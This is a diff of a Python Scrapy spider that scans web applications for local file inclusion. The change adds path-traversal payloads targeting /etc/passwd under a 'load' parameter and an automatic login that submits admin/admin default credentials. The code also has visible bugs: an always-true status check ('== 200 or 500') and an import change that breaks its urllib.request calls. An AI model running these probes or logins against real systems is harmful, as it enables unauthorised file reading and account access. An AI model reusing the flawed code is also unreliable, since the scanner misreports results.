@@ -1,7 +1,7 @@
 import sys
 import socket
 import requests
-import urllib.request
+import urllib
 import ssl
 import json
 import scrapy
@@ -13,6 +13,9 @@ testList = [
 "?file=../../../../../../etc/passwd%00",
 "?file=../../../../../../etc/passwd%2500",
 "?file=../../../../../../etc/passwd",
+"?load=../../../../../../etc/passwd%00",
+"?load=../../../../../../etc/passwd%2500",
+"?load=../../../../../../etc/passwd",
 "?file=../../../../../../../../../../../../../../../../../../../../etc/passwd%00",
 "?file=../../../../../../../../../../../../../../../../../../../../etc/passwd%2500",
 "?file=../../../../../../../../../../../../../../../../../../../../etc/passwd"]
@@ -22,7 +25,31 @@ class A3Spider(scrapy.Spider):
 	name = "a3"
 
 	def parse(self, response):
-		#TODO: check if need login
+		#TODO: check if is infinite loop
+		#Calendar in app1 causes infinite loop now.
+
+
+		# I'm just going to assume the login forms won't appear again.
+		usernameLogin = response.xpath('//input[@name="username"]').extract_first()
+		passwordLogin = response.xpath('//input[@name="password" or @type="password"]').extract_first()
+
+		#TODO: password and username wordlists?
+		#TODO: ADD USER LOGINS
+		if usernameLogin is not None and passwordLogin is not None:
+			#test for csrftokens
+			token1 = response.xpath('//input[@name="csrftoken"and @type="hidden"]')
+			token2 = response.xpath('//input[@name="csrfmiddlewaretoken" and @type="hidden"]')
+			if token1 is not None:
+				return scrapy.FormRequest.from_response(response,formdata={'username' : 'admin', 
+												'password' : 'admin' ,
+												 'csrftoken' : token1}, callback = self.parse)
+			elif token2 is not None:
+				return scrapy.FormRequest.from_response(response,formdata={'username' : 'admin', 
+												'password' : 'admin', 
+												'csrfmiddlewaretoken' : token2},callback = self.parse)
+			else:
+				return scrapy.FormRequest.from_response(response,formdata={'username' : 'admin',
+												 'password' : 'admin'}, callback = self.parse)
 		print(response)
 		# parse for lfi	
 		for testThis in testList:
@@ -52,6 +79,7 @@ class A3Spider(scrapy.Spider):
 					url = str(response)
 					url = url.replace("200 ", "")
 					splitString = cleanUp(url)
+					#TODO: add type for GET and POST
 					yield {
 						'injection_point' : splitString[0][1:],
 						'param' : splitString[1], 
@@ -61,20 +89,21 @@ def tryConnect(url):
 	ctx = ssl.create_default_context()
 	ctx.check_hostname = False
 	ctx.verify_mode = ssl.CERT_NONE	
-	#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM):
 	try:
 		req = urllib.request.Request(url)
 		response = urllib.request.urlopen(req, context=ctx).code
 		#print(response)
 		#status = s.connect_ex((url,443))
 		#s.close()
-		if response == 200:
+		if response == 200 or 500: 
 			print (url)
 			scrapList.append(url)
 			#resultList.write(url + "\n")
-	except Exception as e: 
-		pass
-		#print(str(e))
+	except Exception as e:
+		if "HTTP Error 404: Not Found" not in str(e):
+			print(url)
+			scrapList.append(url)
 
 def cleanUp(cleanThis):
 	#need to test which one of tests for file inclusion we used
